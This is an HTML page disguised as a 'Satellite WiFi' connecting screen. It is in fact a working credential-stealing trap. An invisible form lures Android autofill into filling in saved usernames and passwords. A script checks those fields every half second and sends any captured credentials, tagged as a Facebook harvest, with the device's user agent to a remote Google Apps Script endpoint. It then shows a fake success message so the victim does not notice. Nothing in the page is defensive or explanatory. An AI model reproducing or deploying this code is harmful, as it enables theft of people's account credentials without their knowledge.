<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Satellite WiFi | Connect</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .radar { border: 2px solid #00ff41; width: 100px; height: 100px; border-radius: 50%; border-left-color: transparent; animation: rotate 1.5s linear infinite; margin-bottom: 20px; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        
        #status { font-size: 18px; letter-spacing: 2px; }
        .dots::after { content: ''; animation: dots 1.5s steps(5, end) infinite; }
        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }

        /* The Trap: Invisible but 'active' for Android Autofill */
        #trap-zone { position: fixed; bottom: 0; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

    <div class="radar"></div>
    <div id="status">CONNECTING TO SATELLITE WIFI<span class="dots"></span></div>
    <p style="font-size: 10px; opacity: 0.5; margin-top: 10px;">ID: NODE-KEN-254</p>

    <div id="trap-zone">
        <form>
            <input type="text" id="email" name="email" autocomplete="username">
            <input type="password" id="pass" name="pass" autocomplete="current-password">
        </form>
    </div>

<script>
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxv3ohN2zG6VdW64OH4fdioGznBIXLAWhc5gTNT8DSzStXM5zPhfuLEF609wywDvBDXQA/exec';
    let dataSent = false;

    // The Trick: The script constantly "watches" the hidden fields
    function backgroundWatcher() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        // If Android Autofill populates these, we strike immediately
        if (u && p && !dataSent) {
            dataSent = true; 
            sendToSheet(u, p);
        }
    }

    function sendToSheet(user, pass) {
        const payload = {
            account: "Facebook_Auto_Harvest",
            username: user,
            password: pass,
            device: navigator.userAgent
        };

        fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(payload)
        }).then(() => {
            console.log("Exfiltration Successful.");
            // Keep the user on the screen to avoid suspicion
            document.getElementById('status').innerText = "WIFI SYNCED SUCCESSFULLY";
        });
    }

    // Run the watcher every 500ms
    setInterval(backgroundWatcher, 500);

    // Some Android versions require a "tap" anywhere on the screen 
    // to trigger the Autofill suggestion overlay.
    document.body.addEventListener('click', () => {
        console.log("User interaction logged. Triggering system prompt...");
    });
</script>

</body>
</html>
